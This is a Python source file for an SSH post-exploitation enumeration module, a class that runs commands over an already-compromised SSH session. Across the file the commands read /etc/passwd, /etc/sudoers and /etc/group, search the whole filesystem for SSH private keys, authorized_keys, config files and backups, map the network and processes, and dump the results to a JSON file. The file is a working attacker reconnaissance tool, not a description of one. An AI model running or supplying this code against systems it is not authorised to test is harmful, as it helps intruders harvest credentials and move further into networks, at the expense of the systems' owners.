import os
import re
import json
from typing import Dict, List, Optional
from paramiko import SSHClient
from pathlib import Path

class SSHPostEnum:
    """Post-exploitation enumeration module for SSH access"""
    
    def __init__(self, ssh_client: SSHClient):
        self.ssh = ssh_client
        self.enum_data = {}
        
    def execute(self, command: str) -> Optional[str]:
        """Execute command and return output"""
        try:
            _, stdout, stderr = self.ssh.exec_command(command)
            return stdout.read().decode().strip()
        except Exception:
            return None
    
    def get_system_info(self) -> Dict:
        """Gather basic system information"""
        info = {
            'hostname': self.execute('hostname'),
            'os': self.execute('uname -a'),
            'kernel': self.execute('cat /proc/version'),
            'distribution': self.execute('cat /etc/*-release'),
            'uptime': self.execute('uptime'),
            'date': self.execute('date'),
            'whoami': self.execute('whoami'),
            'id': self.execute('id'),
        }
        self.enum_data['system_info'] = {k:v for k,v in info.items() if v}
        return self.enum_data['system_info']
    
    def get_network_info(self) -> Dict:
        """Gather network configuration"""
        net_info = {
            'interfaces': self.execute('ifconfig -a || ip a'),
            'routes': self.execute('route -n || ip route'),
            'arp': self.execute('arp -a || ip neigh'),
            'dns': self.execute('cat /etc/resolv.conf'),
            'connections': self.execute('netstat -antup || ss -tulnp'),
            'iptables': self.execute('iptables -L -n'),
        }
        self.enum_data['network_info'] = {k:v for k,v in net_info.items() if v}
        return self.enum_data['network_info']
    
    def get_user_info(self) -> Dict:
        """Enumerate users and groups"""
        users = {
            'current_user': self.execute('whoami'),
            'all_users': self.execute('cat /etc/passwd'),
            'logged_in': self.execute('w || who'),
            'sudoers': self.execute('cat /etc/sudoers'),
            'groups': self.execute('cat /etc/group'),
            'last_logins': self.execute('last'),
            'home_dirs': self.execute('ls -la /home'),
        }
        self.enum_data['user_info'] = {k:v for k,v in users.items() if v}
        return self.enum_data['user_info']
    
    def get_process_info(self) -> Dict:
        """Enumerate running processes"""
        processes = {
            'all_processes': self.execute('ps aux'),
            'root_processes': self.execute('ps aux | grep root'),
            'cron_jobs': self.execute('crontab -l'),
            'services': self.execute('systemctl list-units --type=service --state=running'),
        }
        self.enum_data['process_info'] = {k:v for k,v in processes.items() if v}
        return self.enum_data['process_info']
    
    def get_interesting_files(self) -> Dict:
        """Find potentially sensitive files"""
        files = {
            'ssh_keys': self.execute('find / -name "id_*" -o -name "*.pub" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null'),
            'config_files': self.execute('find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null'),
            'scripts': self.execute('find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null'),
            'logs': self.execute('find /var/log/ -type f -exec ls -la {} + 2>/dev/null'),
            'backups': self.execute('find / -name "*.bak" -o -name "*~" -o -name "*.old" 2>/dev/null'),
        }
        self.enum_data['interesting_files'] = {k:v for k,v in files.items() if v}
        return self.enum_data['interesting_files']
    
    def get_installed_software(self) -> Dict:
        """List installed packages"""
        software = {
            'dpkg': self.execute('dpkg -l'),
            'rpm': self.execute('rpm -qa'),
            'pip': self.execute('pip list'),
            'gem': self.execute('gem list'),
            'npm': self.execute('npm list -g --depth=0'),
        }
        self.enum_data['installed_software'] = {k:v for k,v in software.items() if v}
        return self.enum_data['installed_software']
    
    def run_all_checks(self) -> Dict:
        """Run all enumeration checks"""
        self.get_system_info()
        self.get_network_info()
        self.get_user_info()
        self.get_process_info()
        self.get_interesting_files()
        self.get_installed_software()
        return self.enum_data
    
    def save_results(self, output_file: str = "enum_results.json") -> bool:
        """Save enumeration results to file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(self.enum_data, f, indent=2)
            return True
        except Exception:
            return False